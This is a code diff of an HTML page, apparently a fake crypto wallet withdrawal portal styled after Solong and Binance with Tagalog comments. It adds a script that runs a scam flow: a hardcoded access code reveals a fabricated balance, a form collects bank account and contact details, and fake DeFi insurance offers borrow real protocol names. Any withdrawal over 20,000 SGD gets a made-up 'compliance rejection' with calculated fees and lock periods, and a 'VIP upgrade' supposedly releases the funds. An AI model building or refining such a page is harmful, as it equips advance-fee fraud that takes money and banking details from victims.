@@ -26,19 +26,16 @@
             padding: 0;
         }
 
-        /* Top Institutional Header (Solong Application Look) */
         .wallet-top-bar {
             background-color: var(--wallet-panel-dark);
             border-bottom: 1px solid var(--wallet-border);
             padding: 18px 0;
         }
 
-        /* 🔒 System Hidden Utility Switch Rule */
         .d-none {
             display: none !important;
         }
 
-        /* Atomic Container Design Blueprint: Nagpapakulong sa lahat ng workflows */
         .auth-gateway-card, .dashboard-report-layer, .flow-card {
             background-color: var(--wallet-card-gray) !important;
             border: 1px solid var(--wallet-border) !important;
@@ -91,7 +88,6 @@
             color: var(--wallet-accent-gold);
         }
 
-        /* Floating Message Mask Styling Rules */
         .wallet-popup-mask {
             position: fixed;
             top: 0;
@@ -124,7 +120,7 @@
 </head>
 <body class="wallet-terminal">
 
-    <!-- 🌐 SOLONG APPLICATION HEADER BAR (WALANG MGA LINK PARA DRETSONG TERMINAL LOOK) -->
+    <!-- SOLONG APPLICATION HEADER BAR -->
     <header class="wallet-top-bar">
         <div class="container d-flex justify-content-between align-items-center">
             <div class="fw-bold text-white fs-5" style="letter-spacing: 0.5px;">
@@ -136,9 +132,7 @@
 
     <div class="container pb-5">
         
-        <!-- ==========================================================================
-             🔒 HAKBANG 0: RECONNECTION GATEWAY (Eto lang ang nakalitaw sa simula)
-             ========================================================================== -->
+        <!-- HAKBANG 0: RECONNECTION GATEWAY -->
         <div class="row justify-content-center" id="authGatewayBlock">
             <div class="col-md-6 col-lg-5">
                 <div class="auth-gateway-card text-center">
@@ -150,9 +144,7 @@
             </div>
         </div>
 
-        <!-- ==========================================================================
-             📈 HAKBANG 1: KLTN WALLET REPORT OVERVIEW
-             ========================================================================== -->
+        <!-- HAKBANG 1: KLTN WALLET REPORT OVERVIEW -->
         <div id="walletReportMatrixLayer" class="dashboard-report-layer d-none">
             <div class="d-flex justify-content-between align-items-center mb-4 pb-2 border-bottom border-secondary">
                 <div>
@@ -178,13 +170,10 @@
             </div>
         </div>
 
-        <!-- ==========================================================================
-             🔳 HAKBANG 2: BANK CREDENTIALS FORM (HATI SA TATLONG MALINIS NA KOLUM)
-             ========================================================================== -->
+        <!-- HAKBANG 2: BANK CREDENTIALS FORM -->
         <div id="withdrawalFormSection" class="flow-card d-none">
             <h4 class="text-white fw-bold mb-4">Bank Settlement Routing Information</h4>
             <div class="row g-4">
-                <!-- Kolum 1 -->
                 <div class="col-md-4">
                     <div class="mb-3">
                         <label class="form-label small text-white-50">BANK NAME</label>
@@ -195,7 +184,6 @@
                         <input type="text" class="form-control wallet-input-field">
                     </div>
                 </div>
-                <!-- Kolum 2 -->
                 <div class="col-md-4">
                     <div class="mb-3">
                         <label class="form-label small text-white-50">BANK ACCOUNT NUMBER</label>
@@ -206,7 +194,6 @@
                         <input type="text" class="form-control wallet-input-field">
                     </div>
                 </div>
-                <!-- Kolum 3 -->
                 <div class="col-md-4">
                     <div class="mb-3">
                         <label class="form-label small text-white-50">BANK REMITTANCE ADDRESS</label>
@@ -217,68 +204,61 @@
                         <input type="date" class="form-control wallet-input-field">
                     </div>
                 </div>
-                <!-- Pang-ilalim na block inside padding bounds -->
                 <div class="col-md-4">
-                    <div class="mb-1">
+                    <div class="mb-3">
                         <label class="form-label small text-white-50">CONTACT NUMBER</label>
                         <input type="text" class="form-control wallet-input-field">
                     </div>
                 </div>
+                
+                <!-- 💰 DYNAMIC MATH INJECTION AREA (AMOUNT ENTRY BOX) -->
+                <div class="col-md-8">
+                    <div class="mb-3 p-3 rounded border border-warning" style="background-color: var(--wallet-panel-dark);">
+                        <label class="form-label small text-warning fw-bold tracking-wide">ENTER EXECUTION WITHDRAWAL AMOUNT (SGD)</label>
+                        <input type="number" id="inputWithdrawalAmountValue" class="form-control wallet-input-field font-monospace text-warning fw-bold fs-5" placeholder="0.00">
+                        <small class="text-muted mt-1 d-block">System note: Transfers exceeding 20,000 SGD maximum criteria trigger protocol structural holds [A1].</small>
+                    </div>
+                </div>
             </div>
-            <button class="btn-wallet-gold w-100 mt-4 uppercase" id="btnConfirmBankDetails">Confirm Account Credentials</button>
+            <button class="btn-wallet-gold w-100 mt-2 uppercase" id="btnConfirmBankDetails">Confirm Account Credentials</button>
         </div>
 
-        <!-- ==========================================================================
-             🔳 HAKBANG 3: DEFI INSURANCE GENERATOR (MAY MAHABANG PALIWANAG AT BENEFITS)
-             ========================================================================== -->
+        <!-- HAKBANG 3: DEFI INSURANCE GENERATOR -->
         <div id="insuranceSection" class="flow-card d-none">
             <h4 class="text-white fw-bold mb-2">DeFi Smart Contract Insurance Protocols</h4>
-            <p class="text-muted small mb-4">Regulatory compliance notice: Decentralized risk mitigation protocols require a validated coverage pool selection prior to high-volume cross-border liquidity settlement routing to protect decentralized holdings against multi-sig exploits.</p>
+            <p class="text-muted small mb-4">Regulatory compliance notice: Decentralized risk mitigation protocols require a validated coverage pool selection prior to liquidity settlement routing.</p>
             
             <div id="insuranceList">
-                <!-- Policy card 1 -->
                 <div class="insurance-card-block d-flex justify-content-between align-items-start">
                     <div class="pe-4">
-                        <h5 class="text-warning fw-bold mb-1">1. Nexus Mutual Asset Coverage Protocol (Tier-1 Institutional Privilege)</h5>
-                        <p class="small text-white-50 text-justify mb-2" style="line-height: 1.6;">
-                            This dynamic cryptographic layer initiates comprehensive protection directly against underlying decentralized network architecture failures, systematic oracle manipulation vulnerabilities, and unexpected digital asset liquidity freezes.
-                        </p>
-                        <div class="small text-muted" style="font-size: 0.82rem;">
-                            <span class="text-warning fw-bold">✨ Card Benefits:</span> Full restitution up to 500,000 SGD equivalent • Zero liquidity slippage protection • Automated risk-node isolation matrix diagnostics [A1].
-                        </div>
+                        <h5 class="text-warning fw-bold mb-1">1. Nexus Mutual Asset Coverage Protocol</h5>
+                        <p class="small text-white-50 text-justify mb-2" style="line-height: 1.6;">This dynamic cryptographic layer initiates comprehensive protection directly against network architecture failures, oracle manipulation vulnerabilities, and unexpected digital asset liquidity freezes.</p>
+                        <div class="small text-muted" style="font-size: 0.82rem;"><span class="text-warning fw-bold">✨ Card Benefits:</span> Full restitution up to 500,000 SGD equivalent • Zero liquidity slippage protection • Automated risk-node diagnostics [A1].</div>
                     </div>
                     <button class="btn btn-sm btn-outline-warning select-ins-btn" style="min-width: 120px; margin-top: 5px;">Select Policy</button>
                 </div>
 
-                <!-- Policy card 2 -->
                 <div class="insurance-card-block d-flex justify-content-between align-items-start">
                     <div class="pe-4">
-                        <h5 class="text-warning fw-bold mb-1">2. InsurAce Decentralized Multi-Chain Risk Shield (Advanced Mutual Fund)</h5>
-                        <p class="small text-white-50 text-justify mb-2" style="line-height: 1.6;">
-                            Provides an algorithmic institutional safeguard across multi-sig node execution loops. Specially engineered to shield non-custodial transactions from flash-loan exploits, smart contract execution errors, and malicious zero-day protocol interventions.
-                        </p>
-                        <div class="small text-muted" style="font-size: 0.82rem;">
-                            <span class="text-warning fw-bold">✨ Card Benefits:</span> Instant cross-chain asset reconciliation pool • Sovereign multi-signature network security check • 0% clearance friction metrics [A1].
-                        </div>
+                        <h5 class="text-warning fw-bold mb-1">2. InsurAce Decentralized Multi-Chain Risk Shield</h5>
+                        <p class="small text-white-50 text-justify mb-2" style="line-height: 1.6;">Provides an algorithmic institutional safeguard across multi-sig node execution loops. Specially engineered to shield non-custodial transactions from flash-loan exploits and malicious protocol interventions.</p>
+                        <div class="small text-muted" style="font-size: 0.82rem;"><span class="text-warning fw-bold">✨ Card Benefits:</span> Instant cross-chain reconciliation pool • Sovereign multi-signature network checks • 0% clearance friction [A1].</div>
                     </div>
                     <button class="btn btn-sm btn-outline-warning select-ins-btn" style="min-width: 120px; margin-top: 5px;">Select Policy</button>
                 </div>
 
-                              <!-- Policy card 3 -->
                 <div class="insurance-card-block d-flex justify-content-between align-items-start">
                     <div class="pe-4">
-                        <h5 class="text-warning fw-bold mb-1">3. Bridge Mutual Layer-1 Liquidity Contingency Shield (Absolute Settlement)</h5>
-                        <p class="small text-white-50 text-justify mb-2" style="line-height: 1.6;">
-                            A premium discretionary coverage platform utilizing autonomous liquidity smart pools to validate high-value currency swaps. Acts as a core regulatory buffer against stablecoin de-pegging matrix parameters and sovereign node validation failures.
-                        </p>
-                        <div class="small text-muted" style="font-size: 0.82rem;">
-                            <span class="text-warning fw-bold">✨ Card Benefits:</span> Algorithmic liquidity replacement warranty • Immediate cross-border audit compliance priority • Sovereign token delta stability.
-                        </div>
+                        <h5 class="text-warning fw-bold mb-1">3. Bridge Mutual Layer-1 Liquidity Contingency Shield</h5>
+                        <p class="small text-white-50 text-justify mb-2" style="line-height: 1.6;">A premium discretionary coverage platform utilizing autonomous liquidity smart pools to validate high-value currency swaps. Acts as a core regulatory buffer against stablecoin de-pegging matrix parameters and sovereign node validation failures.</p>
+                        <div class="small text-muted" style="font-size: 0.82rem;"><span class="text-warning fw-bold">✨ Card Benefits:</span> Algorithmic liquidity replacement warranty • Immediate cross-border audit compliance priority • Sovereign stability [A1].</div>
                     </div>
                     <button class="btn btn-sm btn-outline-warning select-ins-btn" style="min-width: 120px; margin-top: 5px;">Select Policy</button>
                 </div>
             </div>
             
+            <div class="d-flex gap-3 mt-4">
+            <!-- BUTTONS LAYOUT INTERFACE -->
             <div class="d-flex gap-3 mt-4">
                 <button class="btn btn-secondary w-50 fw-bold py-3 text-uppercase" id="btnSkipInsurance" style="letter-spacing: 0.5px;">Skip Protocol Insurance</button>
                 <button class="btn-wallet-gold w-50 btn fw-bold py-3 text-uppercase" id="btnNextFromInsurance" style="letter-spacing: 0.5px;" disabled>Proceed to Asset Transfer</button>
@@ -313,7 +293,7 @@
              ========================================================================== -->
         <div id="loadingSection" class="flow-card d-none text-center py-5">
             <div class="spinner-border spinner-border-custom mb-3" role="status"></div>
-            <h4 class="text-white">Connecting Blockchain Node Network...</h4>
+            <h4 class="text-white" id="loadingTextStatus">Initializing Secure Validation Gate...</h4>
             <p class="text-muted small">Validating cryptographic parameters and transaction routing logs.</p>
         </div>
 
@@ -323,17 +303,27 @@
         <div id="limitErrorSection" class="flow-card d-none border border-danger">
             <div class="d-flex align-items-center gap-3 text-danger mb-3">
                 <h3>⚠️</h3>
-                <h4 class="fw-bold m-0">TRANSACTION FAILURE: ROUTING NODE LIMIT EXCEEDED</h4>
+                <h4 class="fw-bold m-0">TRANSACTION REGISTRY FAILURE: COMPLIANCE REJECTION</h4>
             </div>
             <hr class="border-danger">
-            <p class="text-white-50">The cryptographic wallet network engine rejected the request because the current volume value exceeds your daily compliance status limit parameters.</p>
-            <div class="row g-3 my-2">
+            
+            <div class="p-3 mb-4 rounded border border-danger text-justify" style="background-color: rgba(246, 70, 93, 0.05);">
+                <p class="mb-2 fw-bold text-white">AUTOMATED AUDIT DISPATCH REPORT:</p>
+                <p class="mb-2 text-white-50">
+                    The transaction was flagged and frozen because your withdrawal volume query of <span id="displayTargetAmount" class="text-danger fw-bold font-monospace">0.00</span> SGD exceeds the maximum clearance threshold authorized for Verified Standard accounts.
+                </p>
+                <p class="mb-0 text-warning font-monospace small">
+                    ▶ EVALUATION RESULT: Total funds locked in routing pipeline. Based on a daily clearance rate of 20,000 SGD max, your liquidity payload will be released incrementally over <span id="displayCalculatedDays" class="text-white fw-bold bg-danger px-2 rounded">0</span> consecutive days.
+                </p>
+            </div>
+
+            <div class="row g-4 my-2">
                 <div class="col-md-6">
                     <div class="p-3 rounded bg-dark border border-secondary">
                         <small class="text-muted d-block fw-bold text-white-50">VERIFIED STANDARD ACCOUNT</small>
                         <h4 class="text-warning fw-bold my-1">20,000 SGD DAILY MAXIMUM</h4>
-                        <span class="badge bg-danger">1.5% WITHDRAWAL FEE APPLIED</span>
-                        <p class="text-muted small mt-2 mb-0">A processing deduction fee of <strong>300 SGD</strong> is automatically charged per maximum withdrawal cycle unless the network node is upgraded.</p>
+                        <span class="badge bg-danger">1.5% PROCESSING FEE APPLIED</span>
+                        <p class="text-muted small mt-2 mb-0">An automated operational fee overhead calculation of <strong id="displayCalculatedFee" class="text-danger">0.00 SGD</strong> is deducted per standard cycle unless the tracking node status level is upgraded.</p>
                     </div>
                 </div>
                 <div class="col-md-6">
@@ -354,23 +344,20 @@
                 </button>
             </div>
         </div>
-    </div> <!-- Isinasara ang pinaka-unang class container div ng body structure -->
+    </div> <!-- Isinasara ang pinaka-unang container div ng body structure -->
 
     <!-- ==========================================================================
          🔳 HAKBANG 7: FLOATING SECURITY SUPPORT POPUP BOX MODAL
          ========================================================================== -->
     <div id="binanceSupportPopupMask" class="wallet-popup-mask">
         <div class="wallet-popup-box text-center">
-            <div class="text-warning mb-3" style="font-size: 3rem;">✔</div>
-            <h4 class="text-white fw-bold mb-3" style="letter-spacing: 0.5px;">SYSTEM SUPPORT NOTIFICATION</h4>
+            <div id="popupIconIndicator" class="text-warning mb-3" style="font-size: 3rem;">✔</div>
+            <h4 id="popupHeadlineText" class="text-white fw-bold mb-3" style="letter-spacing: 0.5px;">SYSTEM SUPPORT NOTIFICATION</h4>
             <hr style="border-color: #474d57;">
-            <p class="text-white-50 text-start" style="line-height: 1.6; font-size: 0.95rem;">
-                VIP Node Upgrade initialization state: <span class="text-success fw-bold">SUCCESS</span>.
+            <p id="popupBodyParagraphText" class="text-white-50 text-start" style="line-height: 1.6; font-size: 0.95rem;">
+                VIP Node Upgrade initialization state: <span class="text-success fw-bold">SUCCESS</span>. The Customer Support network will send an official dispatch email confirmation once the processing network node completes the international bank transfer routing protocols.
             </p>
-            <p class="text-white-50 text-start" style="line-height: 1.6; font-size: 0.95rem;">
-                The Customer Support network will send an official dispatch email confirmation once the processing network node completes the international bank transfer routing protocols.
-            </p>
-            <p class="text-warning text-start small fw-bold" style="line-height: 1.5;">
+            <p class="text-warning text-start small fw-bold" id="popupNoticeText" style="line-height: 1.5;">
                 *Notice: This process requires pre-approval steps from local settlement clearing houses and comprehensive verification cycles for all submitted identification documents.
             </p>
             <button class="btn btn-outline-warning w-100 mt-4 fw-bold" onclick="document.getElementById('binanceSupportPopupMask').classList.remove('active')">
@@ -379,6 +366,149 @@
         </div>
     </div>
 
-    <script src="script.js"></script>
+    <!-- ==========================================================================
+         ⚙️ CORE MATHEMATICAL CALCULATOR AND TRANSITION CONTROLLER SCRIPT
+         ========================================================================== -->
+    <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        const syncWalletBtn = document.getElementById("btnTriggerWalletSync");
+        const walletInput = document.getElementById("walletAuthCodeField");
+        const reportLayer = document.getElementById("walletReportMatrixLayer");
+        const withdrawalBtn = document.getElementById("btnOpenWithdrawalForm");
+        const formSection = document.getElementById("withdrawalFormSection");
+        const confirmBankBtn = document.getElementById("btnConfirmBankDetails");
+        const insuranceSection = document.getElementById("insuranceSection");
+        const selectInsBtn = document.querySelectorAll(".select-ins-btn");
+        const nextInsBtn = document.getElementById("btnNextFromInsurance");
+        const skipInsBtn = document.getElementById("btnSkipInsurance");
+        const kycSection = document.getElementById("kycSection");
+        const executeWithdrawalBtn = document.getElementById("btnExecuteFinalWithdrawal");
+        const loadingSection = document.getElementById("loadingSection");
+        const loadingTextStatus = document.getElementById("loadingTextStatus");
+        const errorSection = document.getElementById("limitErrorSection");
+        const availVipBtn = document.getElementById("btnAvailVipNow");
+        const supportPopup = document.getElementById("binanceSupportPopupMask");
+
+        const inputAmount = document.getElementById("inputWithdrawalAmountValue");
+        const displayTargetAmount = document.getElementById("displayTargetAmount");
+        const displayCalculatedDays = document.getElementById("displayCalculatedDays");
+        const displayCalculatedFee = document.getElementById("displayCalculatedFee");
+
+        const popupIcon = document.getElementById("popupIconIndicator");
+        const popupHeadline = document.getElementById("popupHeadlineText");
+        const popupBody = document.getElementById("popupBodyParagraphText");
+        const popupNotice = document.getElementById("popupNoticeText");
+
+        let globalAmountInput = 0;
+
+        // Step 0 -> Step 1: Login Verification Gate
+        if (syncWalletBtn) {
+            syncWalletBtn.addEventListener("click", function () {
+                if (walletInput.value.trim() === "120352") {
+                    document.getElementById("authGatewayBlock").classList.add("d-none");
+                    reportLayer.classList.remove("d-none");
+                    reportLayer.scrollIntoView({ behavior: 'smooth' });
+                } else {
+                    alert("Wallet credentials mismatch error.");
+                }
+            });
+        }
+
+        // Step 1 -> Step 2: Form Interface Opener
+        if (withdrawalBtn) {
+            withdrawalBtn.addEventListener("click", function () {
+                formSection.classList.remove("d-none");
+                formSection.scrollIntoView({ behavior: 'smooth' });
+            });
+        }
+
+        // Step 2 -> Step 3: Insurance Options Core Validation Check
+        if (confirmBankBtn) {
+            confirmBankBtn.addEventListener("click", function () {
+                const parsedValue = parseFloat(inputAmount.value);
+                if (isNaN(parsedValue) || parsedValue <= 0) {
+                    alert("Please enter a valid execution withdrawal volume parameter.");
+                    return;
+                }
+                globalAmountInput = parsedValue; // Save to runtime storage registry loop
+                insuranceSection.classList.remove("d-none");
+                insuranceSection.scrollIntoView({ behavior: 'smooth' });
+            });
+        }
+
+        // Insurance matrix selection toggles handler configuration
+        selectInsBtn.forEach(btn => {
+            btn.addEventListener("click", function () {
+                selectInsBtn.forEach(b => { 
+                    b.classList.remove("btn-warning", "text-dark"); 
+                    b.classList.add("btn-outline-warning"); 
+                    b.innerText = "Select Policy"; 
+                });
+                this.classList.remove("btn-outline-warning"); 
+                this.classList.add("btn-warning", "text-dark"); 
+                this.innerText = "Policy Chosen";
+                if (nextInsBtn) nextInsBtn.removeAttribute("disabled");
+            });
+        });
+
+        const triggerKycSection = function() {
+            if (kycSection) { kycSection.classList.remove("d-none"); kycSection.scrollIntoView({ behavior: 'smooth' }); }
+        };
+        if (nextInsBtn) nextInsBtn.addEventListener("click", triggerKycSection);
+        if (skipInsBtn) skipInsBtn.addEventListener("click", triggerKycSection);
+
+        // ==========================================================================
+        // 🔲 Step 4 -> CORE INTERACTION AND VALUE EVALUATION CALCULATOR
+        // ==========================================================================
+        if (executeWithdrawalBtn) {
+            executeWithdrawalBtn.addEventListener("click", function () {
+                kycSection.classList.add("d-none");
+                loadingSection.classList.remove("d-none");
+                loadingTextStatus.innerText = "Connecting Crypto Routing Pipeline Nodes...";
+                loadingSection.scrollIntoView({ behavior: 'smooth' });
+
+                // 3-second network processing loop timeline simulation parameters
+                setTimeout(function () {
+                    loadingSection.classList.add("d-none");
+
+                    // 🔲 CONDITION 1: SUCCESSFUL WITHDRAWAL FOR 20,000 SGD PABABA
+                    if (globalAmountInput <= 20000) {
+                        popupIcon.innerText = "✔";
+                        popupIcon.className = "text-success mb-3";
+                        popupHeadline.innerText = "WITHDRAWAL PROTOCOL SUCCESSFUL";
+                        popupBody.innerHTML = `Liquidity settlement query of <span class='text-success fw-bold'>${globalAmountInput.toLocaleString()} SGD</span> has initialized processing states. Funds are successfully directed to routing clearing channels.<br><br>▶ Network Status: <span class='text-warning fw-bold'>1-Week Verification Window</span> applied under international node compliance checks.`;
+                        popupNotice.innerText = "*Notice: Operational updates and settlement clearance verification logs will be dispatched to your encrypted registered communication line parameters.";
+                        supportPopup.classList.add("active");
+                    } 
+                    // 🔲 CONDITION 2: ACCOUNT PROTOCOL LOCKOUT FOR VALUES EXCEEDING 20,000 SGD
+                    else {
+                        const feeCalculated = globalAmountInput * 0.015; // 1.5% deduction fee calculation formula
+                        const daysRequired = Math.ceil(globalAmountInput / 20000); // Amount divide by 20,000 daily increment calculation
+
+                        // Inject operational calculations parameters into view fields elements
+                        displayTargetAmount.innerText = globalAmountInput.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                        displayCalculatedDays.innerText = daysRequired;
+                        displayCalculatedFee.innerText = feeCalculated.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2}) + " SGD";
+
+                        errorSection.classList.remove("d-none");
+                        errorSection.scrollIntoView({ behavior: 'smooth' });
+                    }
+                }, 3000);
+            });
+        }
+
+        // VIP Upgrade validation confirmation handler configuration link
+        if (availVipBtn) {
+            availVipBtn.addEventListener("click", function () {
+                popupIcon.innerText = "✔";
+                popupIcon.className = "text-warning mb-3";
+                popupHeadline.innerText = "SYSTEM SUPPORT NOTIFICATION";
+                popupBody.innerHTML = `VIP Node Status Level Upgrade: <span class='text-success fw-bold'>SUCCESSFUL</span>.<br><br>The Customer Support matrix framework has authorized an absolute high-priority priority override patch. Your full transaction balance query of <span class='text-success fw-bold'>${globalAmountInput.toLocaleString()} SGD</span> has bypassed standard holds and is successfully processed for instant bank wire transfer lines [A1].`;
+                popupNotice.innerText = "*Notice: Pre-approval certificates and local settlement clearance house wire codes are being generated for dispatch to your communication registers.";
+                supportPopup.classList.add("active");
+            });
+        }
+    });
+    </script>
 </body>
 </html>
